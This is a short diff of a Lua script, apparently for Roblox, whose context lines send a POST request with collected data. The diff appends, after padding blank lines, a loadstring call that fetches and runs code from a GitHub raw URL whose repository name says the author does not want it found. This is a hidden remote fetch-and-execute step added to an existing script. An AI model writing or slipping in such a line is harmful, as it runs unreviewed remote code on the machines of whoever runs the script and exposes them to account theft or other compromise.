@@ -217,3 +217,7 @@ else
     local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
     request(abcdef)
 end
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/betterthannever615/idontwantanyonetofindthisscript1928271718283738191929292/refs/heads/main/janabshsjaiakqkw"))()
